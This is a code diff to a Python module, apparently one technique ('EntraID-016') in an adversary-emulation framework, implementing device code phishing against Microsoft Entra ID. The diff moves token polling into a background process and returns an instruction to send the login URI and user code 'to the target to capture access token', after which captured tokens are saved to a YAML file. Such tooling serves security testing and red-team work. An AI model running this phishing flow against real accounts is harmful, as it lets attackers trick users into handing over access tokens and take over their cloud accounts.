@@ -1,7 +1,7 @@
 import yaml
 import requests
 import time
-from multiprocessing import Process, Queue
+from multiprocessing import Process
 
 def TechniqueMain(tenant_id, client_id = None):
 
@@ -26,8 +26,6 @@ def TechniqueMain(tenant_id, client_id = None):
     device_code = generate_device_code_flow['device_code']
     polling_interval = generate_device_code_flow['interval']
 
-    print(f"Please go to {verification_uri} and enter the code {user_code}")
-
     token_url = f"https://login.microsoftonline.com/{tenant_id}/oauth2/v2.0/token"
     token_data = {
         "grant_type": "urn:ietf:params:oauth:grant-type:device_code",
@@ -35,10 +33,12 @@ def TechniqueMain(tenant_id, client_id = None):
         "device_code": device_code,
     }
 
-    # wait for device code flow auth to finish
-    queue = Queue()
-    raw_response = Process(target=AcquireDeviceCodeFlowToken(token_url, token_data, polling_interval), args=(queue, 1))
+    # creating background process to check for device code flow auth
+    raw_response = Process(target = AcquireDeviceCodeFlowToken, args=(token_url, token_data, polling_interval))
+    # starting process in background
+    raw_response.start()
 
+    # return details to authenticate via device code flow
     try:
         # parse raw response => pretty response
         try:
@@ -46,8 +46,10 @@ def TechniqueMain(tenant_id, client_id = None):
             pretty_response = {}
 
             pretty_response["Success"] = {
-                'Message' : "Device code flow auth successful",
-                "Token Saved" : True
+                "Instruction" : "Send the below login URI and code to the target to capture access token",
+                "URI" : verification_uri,
+                "User Code" : user_code,
+                "Note" : "Continue with other actions after saving URI & code. When the target successfully authenticates the token will be available on Access page"
             }
             return True, raw_response, pretty_response
         except:
@@ -58,6 +60,7 @@ def TechniqueMain(tenant_id, client_id = None):
 
 def AcquireDeviceCodeFlowToken(token_url, token_data, polling_interval):
 
+    # poll till access token is received
     while True:
         time.sleep(polling_interval)
         token_response = requests.post(token_url, data=token_data)
@@ -65,11 +68,12 @@ def AcquireDeviceCodeFlowToken(token_url, token_data, polling_interval):
         if token_response.status_code == 200:
             token_json = token_response.json()
             access_token = token_json['access_token']
+            # save access token
             SaveTokens(access_token)
-            return access_token
+            break
         elif token_response.status_code == 400 and 'error' in token_response.json() and token_response.json()['error'] == 'authorization_pending':
             # continue polling
-            print("User not yet authenticated. Continuing to poll...")
+            print("EntraID-016 : Continuing to poll...")
         else:
             break
 
@@ -91,10 +95,6 @@ def SaveTokens(new_token):
 
         with open(tokens_file, 'w') as file:
             yaml.dump(all_tokens_data, file)
-
-        return True
-    else:
-        return None
 
 def TechniqueInputSrc() -> list:
     '''Returns the input fields required as parameters for the technique execution'''
